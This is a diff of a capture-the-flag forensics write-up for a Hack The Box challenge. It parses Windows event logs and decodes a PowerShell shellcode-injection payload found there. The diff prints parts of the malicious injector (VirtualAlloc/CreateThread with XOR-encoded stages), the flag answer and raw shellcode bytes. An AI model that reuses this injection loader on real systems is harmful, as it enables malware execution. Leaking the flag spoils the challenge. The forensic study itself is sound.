@@ -1,7 +1,10 @@
 Ended up using a utility called evtxexport to read these files and dump the output quickly and parse for clues.
 
 `apt install libevtx-utils -y`
-`
+
+Ran evtxexport --help to get a list of the commands:
+
+```
 evtxexport 20181227
 
 Missing source file.
@@ -41,21 +44,26 @@ Usage: evtxexport [ -c codepage ] [ -f format ] [ -l log_file ]
 	-T:     use event template definitions to parse the event record data
 	-v:     verbose output to stderr
 	-V:     print version
-`
-Ended up dumping them all to disk into parsable txt files quickly with:
+```
 
-`
+Ended up dumping all event logs to disk into parsable txt files quickly with grep:
+
+```
 ls *.evtx | while read ln ; do echo  -------- $ln --------------------------- ; evtxexport $ln >$ln.txt ; done
-`
-Started going thru them w/ less until I found some interesting stuff in the Powershell logs.
+```
+
+Did a bit of grep looking for a few things, with grep -A30 -B45 to output lots of code Before and After, basically around my search items.  Needed to look more closely though as I am seeing a lot.
+
+
+Started going thru them manually w/ less until I found some interesting stuff in the Powershell logs.
 
 @15:40:31 : powershell process injector found:
 
-# payload.ps1
+## payload.ps1
 
 Looks like some malicious stuff here:
 
-`
+```
 Microsoft-Windows-PowerShell%4Operational.evtx.txt-String: 3			: $OleSPrlmhB = @"
 Microsoft-Windows-PowerShell%4Operational.evtx.txt-[DllImport("kernel32.dll")]
 Microsoft-Windows-PowerShell%4Operational.evtx.txt-public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
@@ -93,11 +101,11 @@ Microsoft-Windows-PowerShell%4Operational.evtx.txt-    $stage3[$i] = $stage3[$i]
 Microsoft-Windows-PowerShell%4Operational.evtx.txt-}
 Microsoft-Windows-PowerShell%4Operational.evtx.txt-
 Microsoft-Windows-PowerShell%4Operational.evtx.txt-$tNZvQCljVk::CreateThread(0,0,$hRffYLENA,0,0,0);
-`
+```
 
 Had to figure out how to decode. Not too hard honestly.. Finally got it, commented out the baddies and outputted some things, had to play with the format a little but I use powershell a lot so this wasn't bad for me.
 
-
+```
 #[System.Runtime.InteropServices.Marshal]::Copy($HVOASfFuNSxRXR,0,$hRffYLENA,$HVOASfFuNSxRXR.Length);
 
 
@@ -114,37 +122,32 @@ for($i=0;$i -lt $stage3.count;$i++){
     $stage3[$i] = $stage3[$i] -bxor 0xd1;
 }
 
-write-output "`r`n`r`nstage3:"
+write-output "`r`n`r`n"
+write-output "stage3:"
 foreach ($c in $stage3) {
   $chr=[char][int]$c
   write-host -NoNewLine $chr
 }
 
-write-output "`r`n`r`nHVOASfFuNSxRXR:"
+write-output "`r`n`r`n"
+write-output "HVOASfFuNSxRXR:"
 foreach ($c in $HVOASfFuNSxRXR) {
   $chr=[char][int]$c
   write-host -NoNewLine $chr
 
 }
 
-#write-output "`r`n`r`nhRffYLENA:"
-#foreach ($c in $hRffYLENA) {
-#  write-host -NoNewLine $c
-#}
-
-
 #$tNZvQCljVk::CreateThread(0,0,$hRffYLENA,0,0,0);
-
+```
 
 
 Cool! Ran it and:
 
 
 
-┌[parrotLT@root]-[20:47-14/05]-[/home/cryptic/htb/ctf/ca2022/forensics_puppeteer]
-└╼$ ./special_orders.ps1         
+## ./special_orders.ps1
 
-
+```
 stage3:
 HTB{b3wh4r3_0f_th3_b00t5_0f_just1c3...}
 
@@ -160,4 +163,5 @@ IÿÎuåèHìH	âM1ÉjAXH	ùAºÙÈ_ÿÕø~UHÄ ^	öj@AYhAXH	òH1ÉAºX¤SåÿÕ
                                                                                                                                        /0ÿÕWYAºunMaÿÕIÿÎé<ÿÿÿHÃH)ÆH
 öu´AÿçXjYIÇÂðµ¢VÿÕ
 
-
+```
+This one was not bad, maybe an hour or so? Fun and rewarding to find.
